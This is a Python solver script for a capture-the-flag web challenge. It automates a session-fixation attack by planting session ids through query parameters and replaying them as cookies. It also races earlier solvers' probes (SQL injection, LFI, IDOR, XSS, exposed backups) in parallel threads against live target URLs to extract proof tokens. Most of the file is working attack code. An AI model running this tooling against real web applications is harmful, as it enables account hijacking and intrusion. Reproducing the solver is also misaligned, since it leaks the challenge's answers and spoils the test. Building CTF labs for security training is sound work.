#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
import json
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
PROOF_RE = re.compile(r"proof_[0-9A-Za-z]{8,}")
SID_PARAMS = ("sid", "session_id", "session", "sessionid", "token", "PHPSESSID")


def _target_url(question, contract):
    art = (question.get("artifact") or "").strip()
    targets = contract.get("targets") or []
    for t in targets:
        if (t.get("id") or "").strip().lower() == art.lower():
            return t.get("url")
    m = re.search(r"\d+", art)
    if m:
        for t in targets:
            n = re.search(r"\d+", t.get("id") or "")
            if n and n.group() == m.group():
                return t.get("url")
        if len(targets) >= int(m.group()):
            return targets[int(m.group()) - 1].get("url")
    return targets[0].get("url") if len(targets) == 1 else None


def _get(url, headers=None, timeout=6):
    """(status, body, set-cookie headers)"""
    h = {"User-Agent": UA, "Accept": "application/json, text/html;q=0.9, */*;q=0.8"}
    h.update(headers or {})
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=timeout) as r:
            return r.status, r.read(1 << 20).decode("utf-8", "replace"), r.headers.get_all("Set-Cookie") or []
    except urllib.error.HTTPError as e:
        return e.code, e.read(1 << 20).decode("utf-8", "replace"), e.headers.get_all("Set-Cookie") or []
    except Exception:  # noqa: BLE001
        return 0, "", []


def _proof(body):
    try:
        j = json.loads(body)
    except ValueError:
        j = None
    if isinstance(j, dict):
        v = j.get("evidence")
        if isinstance(v, str) and PROOF_RE.search(v):
            return PROOF_RE.search(v).group()
    m = PROOF_RE.search(body or "")
    return m.group() if m else None


def session_fixation(base, clues=None):
    """Session fixation: /api/clues names a planting route (`session_id_required` -> ?sid=<id> sets the session
    cookie, the privileged user then logs in on that id) and a status route that needs an authenticated session.
    Plant the hinted id (or our own), then present it as the cookie on every clue route."""
    st, body, _ = clues or _get(urllib.parse.urljoin(base, "/api/clues"))
    try:
        j = json.loads(body)
    except ValueError:
        j = {}
    if not isinstance(j, dict):
        j = {}
    routes = [v for v in j.values() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
    for v in j.values():
        if isinstance(v, list):
            routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
    if not routes:
        _, home, _ = _get(base)
        routes = [r for r in re.findall(r'href="(/[^"#?]+)"', home) if not r.startswith(("/assets", "/api/clues"))]
    routes = list(dict.fromkeys(routes))
    hint = next((v for k, v in j.items() if isinstance(v, str) and re.search(r"sess|sid|token", k, re.I)), None) \
        or secrets.token_hex(6)
    cookies, planted = [], set()
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        st, body, sc = _get(url)
        p = _proof(body)
        if p:
            return p
        if not re.search(r"session|sid", body, re.I) or re.search(r"login|authenticat", body, re.I):
            continue
        for name in SID_PARAMS:
            st, body, sc = _get(url + "?" + urllib.parse.urlencode({name: hint}))
            p = _proof(body)
            if p:
                return p
            if st == 200 and "required" not in body:
                cookies += [c.split(";", 1)[0] for c in sc]
                planted.add(r)
                break
    hint_cookie = [c for c in cookies if c.split("=", 1)[-1] == hint] or cookies
    cands = hint_cookie or [f"{n}={hint}" for n in ("arena_session", "PHPSESSID", "session", "sid", "laravel_session")]
    for r in sorted(routes, key=lambda r: r in planted):   # the protected (non-planting) routes first
        url = urllib.parse.urljoin(base, r)
        for c in cands:
            st, body, _ = _get(url, {"Cookie": c})
            p = _proof(body)
            if p:
                return p
    return None


PRIOR = ("day20/web-stay-in-your-directory", "day02/web-permission-to-slip", "day01/web-back-up-a-minute",
         "day20/web-administratively-speaking", "day03/web-query-me-this", "day21/web-reflect-upon-this",
         "day21/web-stored-for-later")
_mods = {}


def _prior(d):
    """An earlier web day's solver module (loaded once per process)."""
    if d not in _mods:
        import importlib.util
        p = ROOT / "challenges" / d / "solver" / "solve.py"
        spec = importlib.util.spec_from_file_location("prior_" + re.sub(r"\W", "_", d), p)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        _mods[d] = mod
    return _mods[d]


def _race(probes, budget):
    """Run every probe in a daemon thread; the first proof-shaped result wins (a non-proof value is kept only as a
    last resort). Losers keep running detached -- the process exits without joining them."""
    import queue
    import threading
    q = queue.Queue()

    def run(name, fn):
        try:
            v = fn()
        except Exception as e:  # noqa: BLE001
            print(f"probe {name}: {e!r}", file=sys.stderr)
            v = None
        q.put((name, v))

    for name, fn in probes:
        threading.Thread(target=run, args=(name, fn), daemon=True).start()
    end, best, left = time.time() + budget, None, len(probes)
    try:
        end = min(end, float(os.environ["HCTF_SOLVE_DEADLINE"]) - 0.4)
    except (KeyError, ValueError):
        pass
    while left:
        try:
            name, v = q.get(timeout=max(0.05, end - time.time()))
        except queue.Empty:
            break
        left -= 1
        if v is not None and PROOF_RE.fullmatch(str(v).strip()):
            print(f"probe {name} won", file=sys.stderr)
            return str(v).strip()
        best = best or v
    return best


def answer(answer_id, question, data, contract):
    """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
    `data`; never hard-code a variant's values.
    Mastery mixes earlier web days' bugs into the targets (D01 backup, D02 IDOR, D03 SQLi, D04 LFI, D05 access
    control, D21 XSS) and the prompt names only today's: race today's probe and every earlier solver's answer()
    (answer() ONLY -- their fallbacks chain into each other) in parallel threads; first proof wins."""
    base = _target_url(question, contract)
    if not base:
        return None
    base = base if base.endswith("/") else base + "/"
    clues = _get(urllib.parse.urljoin(base, "/api/clues"))
    if re.search(r'"[^"]*(?:sess|sid)[^"]*"\s*:', clues[1], re.I):
        # today's construct (a session hint in the clues): run it alone -- the earlier days' payload lists hammering
        # the same app in parallel slowed it 5 s -> 13 s; race the rest only if it finds nothing
        v = session_fixation(base, clues)
        if v:
            return v
    probes = {"session_fixation": lambda: session_fixation(base, clues)}
    for d in PRIOR:
        if (ROOT / "challenges" / d / "solver" / "solve.py").exists():
            probes[d] = lambda d=d: _prior(d).answer(answer_id, question, data, contract)
    # stage 1: only the probes whose construct the cheap recon shows (all probes at once -- x3 Mastery sets --
    # slowed every probe 2-5x); stage 2: the rest, only if stage 1 found nothing
    first = _hinted(base, clues)
    v = _race([(k, f) for k, f in probes.items() if k in first], 40) if first else None
    if v is not None and PROOF_RE.fullmatch(str(v)):
        return v
    return _race([(k, f) for k, f in probes.items() if k not in first], 40) or v


def _hinted(base, clues):
    """Probe names whose construct shows in the home page / robots.txt / clues JSON."""
    import threading
    got = {}

    def fetch(k, path):
        got[k] = _get(urllib.parse.urljoin(base, path))[1]

    ts = [threading.Thread(target=fetch, args=a, daemon=True) for a in (("home", "/"), ("robots", "/robots.txt"))]
    for t in ts:
        t.start()
    for t in ts:
        t.join(8)
    home, robots = got.get("home", ""), got.get("robots", "")
    out = set()
    if re.search(r"(?im)^\s*Disallow:\s*/\S+", robots) or re.search(r"(?i)backup|snapshot|deploy|archive", home):
        out.add("day01/web-back-up-a-minute")
    if re.search(r"Signed in as|href=['\"]/[\w-]+/\d+/?['\"]", home):
        out.add("day02/web-permission-to-slip")
    if re.search(r"<form|<input", home, re.I):
        out.add("day03/web-query-me-this")
    if re.search(r"href=['\"][^'\"]*\?\w+=[^'\"]*[./][^'\"]*['\"]", home):
        out.add("day20/web-stay-in-your-directory")
    try:
        cj = json.loads(clues[1]) if clues[0] == 200 else None
    except ValueError:
        cj = None
    if isinstance(cj, dict):
        out |= {"session_fixation", "day20/web-administratively-speaking", "day21/web-reflect-upon-this",
                "day21/web-stored-for-later"}
    return out


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing: every probe already ran in answer()'s race."""
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    if len(groups) < 2:
        # web ids are `proof-N` (no set prefix): every target is independent -- one group per target/set
        groups = {}
        for aid, q in pairs:
            groups.setdefault(q.get("artifact") or q.get("set") or aid, []).append((aid, q))
    out, pool = {}, []
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            # I/O-bound (live targets): one process per set regardless of CPU count
            ex = ProcessPoolExecutor(max_workers=len(groups), mp_context=mp.get_context("fork"))
            for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                out.update(part)
            pool = list((getattr(ex, "_processes", None) or {}).values())
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out), flush=True)
    # losing race probes still run (an earlier solver's non-daemon ThreadPoolExecutor / 12 s poll): don't join them
    for p in pool:
        p.kill()
    sys.stderr.flush()
    os._exit(0)


if __name__ == "__main__":
    main()
